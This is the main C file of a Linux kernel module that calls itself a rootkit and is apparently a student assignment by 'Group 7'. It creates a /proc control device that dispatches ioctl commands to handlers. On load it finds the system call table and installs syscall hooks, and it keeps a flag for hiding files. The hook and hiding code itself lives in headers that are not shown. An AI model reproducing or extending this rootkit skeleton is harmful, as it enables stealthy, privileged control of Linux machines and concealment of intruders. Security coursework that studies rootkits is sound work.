#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/printk.h>

#include "common.h"
#include "rootkit.h"
#include "ioctl.h"
#include "hook.h"

#define BUFLEN 4096


static int  __init g7_init(void);
static void __exit g7_exit(void);

static int     g7_open(struct inode *, struct file *);
static int     g7_release(struct inode *, struct file *);
static ssize_t g7_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t g7_write(struct file *, const char *, size_t, loff_t *);
static long    g7_ioctl(struct file *, unsigned, unsigned long);


static struct mutex lock;
static char buf[BUFLEN];

static struct file_operations g7_fops =
{
    .owner          = THIS_MODULE,
    .read           = g7_read,
    .write          = g7_write,
    .open           = g7_open,
    .unlocked_ioctl = g7_ioctl,
    .release        = g7_release,
};


rootkit_t rootkit = {
    .hiding_files = false,
};


static int
g7_open(struct inode *inode, struct file *file)
{
    mutex_lock(&lock);
    DEBUG_INFO("[g7_open]\n");
    return 0;
}

static int
g7_release(struct inode *inode, struct file *file)
{
    DEBUG_INFO("[g7_release]\n");
    mutex_unlock(&lock);
    return 0;
}

static ssize_t
g7_read(struct file *file, char __user *buf, size_t len, loff_t *off)
{
    DEBUG_INFO("[g7_read]\n");
    return 0;
}

static ssize_t
g7_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
    DEBUG_INFO("[g7_write]\n");
    return 0;
}

static long
g7_ioctl(struct file *_file, unsigned cmd, unsigned long arg)
{
    channel_t c = detect_channel(cmd);
    DEBUG_NOTICE("[g7_ioctl] on %#10x (%s)\n", cmd, c.name);

    if (((const char *)arg) && c.handler)
        return c.handler(arg);
    else
        return -ENOTTY;
}


static int
g7_init(void)
{
    mutex_init(&lock);
    proc_create_data(G7_DEVICE, S_IRUSR | S_IWUSR, 0, &g7_fops, buf);

    if (retrieve_sys_call_table())
        return -1;

    init_hooks();

    DEBUG_INFO("[g7_init] at /proc/%s\n", G7_DEVICE);
    report_channels();

    return 0;
}

static void
g7_exit(void)
{
    DEBUG_INFO("[g7_exit]\n");
    remove_proc_entry(G7_DEVICE, 0);
    remove_hooks();
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Group 7");
MODULE_DESCRIPTION("Assignment 3");

module_init(g7_init);
module_exit(g7_exit);
